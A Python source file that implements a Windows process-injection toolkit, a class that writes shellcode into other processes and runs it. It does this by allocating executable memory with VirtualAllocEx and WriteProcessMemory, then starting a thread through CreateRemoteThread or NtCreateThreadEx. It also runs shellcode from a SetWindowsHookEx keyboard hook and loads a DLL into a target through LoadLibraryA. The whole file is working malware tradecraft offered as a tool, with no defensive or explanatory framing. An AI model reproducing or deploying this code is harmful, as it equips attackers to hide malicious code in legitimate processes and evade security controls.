import os
import sys
import platform
import logging
import ctypes
import win32api
import win32con
import win32security
import win32process
import win32event
import win32service
import win32serviceutil
import win32timezone
import psutil
import struct
from ctypes import wintypes
import threading
import time

class ProcessInjection:
    def __init__(self):
        self.os_type = platform.system()
        self.setup_logging()
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('process_injection.log'),
                logging.StreamHandler()
            ]
        )
        
    def create_remote_thread(self, process_handle, shellcode):
        """Inject shellcode using CreateRemoteThread"""
        try:
            # Allocate memory in target process
            shellcode_size = len(shellcode)
            remote_memory = ctypes.windll.kernel32.VirtualAllocEx(
                process_handle,
                None,
                shellcode_size,
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                logging.error("Failed to allocate memory")
                return False
                
            # Write shellcode to target process
            written = ctypes.c_size_t(0)
            if not ctypes.windll.kernel32.WriteProcessMemory(
                process_handle,
                remote_memory,
                shellcode,
                shellcode_size,
                ctypes.byref(written)
            ):
                logging.error("Failed to write shellcode")
                return False
                
            # Create remote thread
            thread_h = ctypes.windll.kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                remote_memory,
                None,
                0,
                None
            )
            
            if not thread_h:
                logging.error("Failed to create remote thread")
                return False
                
            logging.info("Successfully injected shellcode")
            return True
            
        except Exception as e:
            logging.error(f"Error in CreateRemoteThread injection: {str(e)}")
            return False
            
    def nt_create_thread_ex(self, process_handle, shellcode):
        """Inject shellcode using NtCreateThreadEx"""
        try:
            # Allocate memory in target process
            shellcode_size = len(shellcode)
            remote_memory = ctypes.windll.kernel32.VirtualAllocEx(
                process_handle,
                None,
                shellcode_size,
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                logging.error("Failed to allocate memory")
                return False
                
            # Write shellcode to target process
            written = ctypes.c_size_t(0)
            if not ctypes.windll.kernel32.WriteProcessMemory(
                process_handle,
                remote_memory,
                shellcode,
                shellcode_size,
                ctypes.byref(written)
            ):
                logging.error("Failed to write shellcode")
                return False
                
            # Get NtCreateThreadEx function
            ntdll = ctypes.windll.ntdll
            thread_h = ctypes.c_void_p()
            
            # Call NtCreateThreadEx
            status = ntdll.NtCreateThreadEx(
                ctypes.byref(thread_h),
                0x1FFFFF,  # THREAD_ALL_ACCESS
                None,
                process_handle,
                remote_memory,
                None,
                0,
                None,
                None,
                None
            )
            
            if status != 0:
                logging.error(f"NtCreateThreadEx failed with status: {status}")
                return False
                
            logging.info("Successfully injected shellcode using NtCreateThreadEx")
            return True
            
        except Exception as e:
            logging.error(f"Error in NtCreateThreadEx injection: {str(e)}")
            return False
            
    def set_windows_hook(self, shellcode):
        """Inject shellcode using SetWindowsHookEx"""
        try:
            # Define hook procedure
            HOOKPROC = ctypes.WINFUNCTYPE(
                ctypes.c_int,
                ctypes.c_int,
                ctypes.c_int,
                ctypes.c_int,
                ctypes.c_int
            )
            
            def hook_proc(nCode, wParam, lParam):
                if nCode >= 0:
                    # Execute shellcode
                    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
                    addr = ctypes.windll.kernel32.VirtualAlloc(
                        ctypes.c_int(0),
                        ctypes.c_int(len(shellcode)),
                        ctypes.c_int(0x3000),
                        ctypes.c_int(0x40)
                    )
                    
                    ctypes.windll.kernel32.RtlMoveMemory(
                        ctypes.c_void_p(addr),
                        shellcode,
                        ctypes.c_int(len(shellcode))
                    )
                    
                    thread_h = ctypes.windll.kernel32.CreateThread(
                        ctypes.c_int(0),
                        ctypes.c_int(0),
                        ctypes.c_void_p(addr),
                        ctypes.c_int(0),
                        ctypes.c_int(0),
                        ctypes.pointer(ctypes.c_int(0))
                    )
                    
                return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
                
            # Set hook
            hook_proc = HOOKPROC(hook_proc)
            hook = ctypes.windll.user32.SetWindowsHookExW(
                win32con.WH_KEYBOARD,
                hook_proc,
                ctypes.windll.kernel32.GetModuleHandleW(None),
                0
            )
            
            if not hook:
                logging.error("Failed to set hook")
                return False
                
            logging.info("Successfully set hook")
            return True
            
        except Exception as e:
            logging.error(f"Error in SetWindowsHookEx injection: {str(e)}")
            return False
            
    def inject_dll(self, process_handle, dll_path):
        """Inject DLL using LoadLibrary"""
        try:
            # Allocate memory for DLL path
            dll_path_bytes = (dll_path + '\0').encode('ascii')
            dll_path_size = len(dll_path_bytes)
            
            remote_memory = ctypes.windll.kernel32.VirtualAllocEx(
                process_handle,
                None,
                dll_path_size,
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_READWRITE
            )
            
            if not remote_memory:
                logging.error("Failed to allocate memory")
                return False
                
            # Write DLL path to target process
            written = ctypes.c_size_t(0)
            if not ctypes.windll.kernel32.WriteProcessMemory(
                process_handle,
                remote_memory,
                dll_path_bytes,
                dll_path_size,
                ctypes.byref(written)
            ):
                logging.error("Failed to write DLL path")
                return False
                
            # Get LoadLibraryA address
            kernel32 = ctypes.windll.kernel32
            loadlib_addr = ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleW("kernel32.dll"),
                b"LoadLibraryA"
            )
            
            # Create remote thread to load DLL
            thread_h = ctypes.windll.kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                loadlib_addr,
                remote_memory,
                0,
                None
            )
            
            if not thread_h:
                logging.error("Failed to create remote thread")
                return False
                
            logging.info("Successfully injected DLL")
            return True
            
        except Exception as e:
            logging.error(f"Error in DLL injection: {str(e)}")
            return False 